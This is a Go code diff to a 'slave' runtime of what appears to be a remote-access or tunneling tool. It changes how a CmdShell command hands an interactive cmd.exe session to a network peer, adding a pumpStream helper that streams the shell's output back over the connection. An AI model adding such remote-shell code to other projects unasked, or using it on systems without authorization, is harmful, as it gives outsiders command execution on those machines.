@@ -49,13 +49,21 @@ var buildSlaveRuntime = func(cfg slaveConfig) (serviceRunner, io.Closer, error) 
 		cmd := payload[0]
 		switch cmd {
 		case protocol.CmdShell:
-			// Run OS Shell
-			shell := "cmd.exe"
-			c := exec.Command(shell)
+			// Run OS Shell with small-output buffering to achieve streaming
+			c := exec.Command("cmd.exe")
 			c.Stdin = conn
-			c.Stdout = conn
-			c.Stderr = conn
-			_ = c.Start()
+			stdoutPipe, err1 := c.StdoutPipe()
+			stderrPipe, err2 := c.StderrPipe()
+			if err1 != nil || err2 != nil {
+				conn.Close()
+				return
+			}
+			if err := c.Start(); err != nil {
+				conn.Close()
+				return
+			}
+			go pumpStream(stdoutPipe, conn)
+			go pumpStream(stderrPipe, conn)
 			go func() {
 				_ = c.Wait()
 				conn.Close()
@@ -99,6 +107,23 @@ var buildSlaveRuntime = func(cfg slaveConfig) (serviceRunner, io.Closer, error) 
 		TunnelManager:  tunnelManager,
 	}
 	return service, executor, nil
+}
+
+// pumpStream reads from r with a small buffer and writes to the tunnel connection.
+// The small buffer (256 bytes) forces fine‑grained chunks for near‑real‑time streaming.
+func pumpStream(r io.Reader, conn net.Conn) {
+    buf := make([]byte, 256)
+    for {
+        n, err := r.Read(buf)
+        if n > 0 {
+            if _, werr := conn.Write(buf[:n]); werr != nil {
+                return
+            }
+        }
+        if err != nil {
+            return
+        }
+    }
 }
 
 func runSlave(cfg slaveConfig) error {
